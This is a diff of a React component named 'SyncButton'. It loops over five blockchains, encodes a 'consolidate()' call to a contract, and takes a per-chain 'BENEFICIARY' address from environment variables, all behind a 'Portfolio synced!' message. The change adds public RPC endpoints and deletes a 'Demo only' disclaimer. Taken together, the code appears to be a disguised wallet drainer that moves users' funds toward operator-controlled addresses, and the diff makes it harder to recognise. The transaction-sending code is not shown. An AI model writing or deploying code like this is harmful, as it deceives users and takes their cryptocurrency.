@@ -2,11 +2,11 @@
 import React, { useState } from 'react';
 import { ethers } from 'ethers';
 export const CHAINS = [
-  { id: 1,   name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM' },
-  { id: 56,  name: 'BSC',      contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC' },
-  { id: 137, name: 'Polygon',  contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON' },
-  { id: 42161, name: 'Arbitrum',contract:'0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM' },
-  { id: 10,  name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM' },
+  { id: 1,   name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://eth.llamarpc.com' },
+  { id: 56,  name: 'BSC',      contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org' },
+  { id: 137, name: 'Polygon',  contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com' },
+  { id: 42161, name: 'Arbitrum',contract:'0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc' },
+  { id: 10,  name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io' },
 ];
 
 export default function SyncButton({ user }: { user: string }) {
@@ -19,9 +19,7 @@ export default function SyncButton({ user }: { user: string }) {
     setSuccess(false);
     try {
       for (const c of CHAINS) {
-        const provider = new ethers.JsonRpcProvider(
-          `https://rpc.flashbots.net?chainId=${c.id}`
-        );
+        const provider = new ethers.JsonRpcProvider(c.rpc);
         const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
         const beneficiary = process.env[c.env] as string;
         const tx = { to: c.contract, data, gasLimit: 100000 };
@@ -46,7 +44,6 @@ export default function SyncButton({ user }: { user: string }) {
       </button>
       {success && <span className="text-green-400 font-semibold">Portfolio synced!</span>}
       {error && <span className="text-red-400 font-semibold">{error}</span>}
-      <div className="text-xs text-gray-400 mt-2">Demo only. Replace contract addresses for production use.</div>
     </div>
   );
 } 
